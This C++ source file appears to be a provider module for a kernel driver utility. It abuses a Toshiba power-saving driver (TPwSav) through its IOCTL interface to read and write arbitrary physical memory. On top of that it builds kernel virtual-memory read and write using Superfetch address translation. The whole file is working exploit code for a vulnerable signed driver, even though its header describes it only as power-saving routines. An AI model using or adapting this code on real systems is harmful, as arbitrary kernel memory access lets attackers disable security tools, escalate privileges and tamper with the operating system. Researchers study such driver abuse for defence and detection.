/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2025
*
*  TITLE:       TPW.CPP
*
*  VERSION:     1.45
*
*  DATE:        16 Dec 2025
*
*  TOSHIBA laptop power saving driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/tpw.h"

static SUPERFETCH_MEMORY_MAP g_TpwMemoryMap = { 0 };
static BOOL g_TpwMemoryMapInitialized = FALSE;

/*
* TpwEnsureMemoryMap
*
* Purpose:
*
* Initialize memory map (once). Only for stable memory layout, otherwise rebuild the map.
*
*/
BOOL TpwEnsureMemoryMap(VOID)
{
    if (g_TpwMemoryMapInitialized)
        return TRUE;

    if (!supBuildSuperfetchMemoryMap(&g_TpwMemoryMap))
        return FALSE;

    g_TpwMemoryMapInitialized = TRUE;

    supPrintfEvent(kduEventInformation,
        "[+] Superfetch memory map built: %llu entries from %lu ranges\r\n",
        g_TpwMemoryMap.TableSize,
        g_TpwMemoryMap.RangeCount);

    return TRUE;
}

/*
* TpwReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory via TPwSav driver.
*
*/
BOOL TpwReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOL DoWrite)
{
    NTSTATUS ntStatus;
    ULONG ioctl;
    LARGE_INTEGER buffer[2];
    IO_STATUS_BLOCK ioStatus;

    if (NumberOfBytes == 0 || Buffer == NULL)
        return FALSE;

    ioctl = DoWrite ? IOCTL_TPW_WRITE_PHYSICAL_MEMORY : IOCTL_TPW_READ_PHYSICAL_MEMORY;
    PBYTE pBuffer = (PBYTE)Buffer;
    for (ULONG i = 0; i < NumberOfBytes; i++) {
        RtlSecureZeroMemory(buffer, sizeof(buffer));
        buffer[0].QuadPart = (ULONG_PTR)(PhysicalAddress + i);
        buffer[1].QuadPart = 0;
        
        if (DoWrite) {
            buffer[1].QuadPart = pBuffer[i];

            ntStatus = supCallDriverEx(DeviceHandle,
                ioctl,
                buffer,
                sizeof(buffer),
                NULL,
                0,
                &ioStatus);

            if (!NT_SUCCESS(ntStatus))
                return FALSE;
        }
        else {
            ntStatus = supCallDriverEx(DeviceHandle,
                ioctl,
                buffer,
                sizeof(buffer),
                buffer,
                sizeof(buffer),
                &ioStatus);

            if (!NT_SUCCESS(ntStatus))
                return FALSE;

            pBuffer[i] = (BYTE)(buffer[1].LowPart & 0xFF);
        }
    }

    return TRUE;
}

/*
* TpwReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory via TPwSav driver.
*
*/
BOOL WINAPI TpwReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return TpwReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* TpwWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory via TPwSav driver.
*
*/
BOOL WINAPI TpwWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return TpwReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* TpwReadKernelVirtualMemory
*
* Purpose:
*
* Read kernel virtual memory via TPwSav driver using Superfetch translation.
*
*/
BOOL WINAPI TpwReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ULONG_PTR currentVA;
    ULONG_PTR currentPA;
    ULONG bytesToRead;
    ULONG bytesRemaining;
    ULONG offset;
    PBYTE destBuffer;

    if (!TpwEnsureMemoryMap())
        return FALSE;

    destBuffer = (PBYTE)Buffer;
    currentVA = Address;
    bytesRemaining = NumberOfBytes;
    offset = 0;

    while (bytesRemaining > 0) {

        if (!supSuperfetchVirtualToPhysical(&g_TpwMemoryMap, currentVA, &currentPA))
            return FALSE;

        bytesToRead = PAGE_SIZE - (ULONG)(currentVA & (PAGE_SIZE - 1));
        if (bytesToRead > bytesRemaining)
            bytesToRead = bytesRemaining;

        if (!TpwReadPhysicalMemory(DeviceHandle, currentPA, destBuffer + offset, bytesToRead))
            return FALSE;

        currentVA += bytesToRead;
        offset += bytesToRead;
        bytesRemaining -= bytesToRead;
    }

    return TRUE;
}

/*
* TpwWriteKernelVirtualMemory
*
* Purpose:
*
* Write kernel virtual memory via TPwSav using Superfetch translation.
*
*/
BOOL WINAPI TpwWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ULONG_PTR currentVA;
    ULONG_PTR currentPA;
    ULONG bytesToWrite;
    ULONG bytesRemaining;
    ULONG offset;
    PBYTE srcBuffer;

    if (!TpwEnsureMemoryMap())
        return FALSE;

    srcBuffer = (PBYTE)Buffer;
    currentVA = Address;
    bytesRemaining = NumberOfBytes;
    offset = 0;

    while (bytesRemaining > 0) {

        if (!supSuperfetchVirtualToPhysical(&g_TpwMemoryMap, currentVA, &currentPA))
            return FALSE;

        bytesToWrite = PAGE_SIZE - (ULONG)(currentVA & (PAGE_SIZE - 1));
        if (bytesToWrite > bytesRemaining)
            bytesToWrite = bytesRemaining;

        if (!TpwWritePhysicalMemory(DeviceHandle, currentPA, srcBuffer + offset, bytesToWrite))
            return FALSE;

        currentVA += bytesToWrite;
        offset += bytesToWrite;
        bytesRemaining -= bytesToWrite;
    }

    return TRUE;
}

/*
* TpwFreeResources
*
* Purpose:
*
* Free provider resources (memory map).
*
*/
VOID TpwFreeResources(VOID)
{
    supFreeSuperfetchMemoryMap(&g_TpwMemoryMap);
}
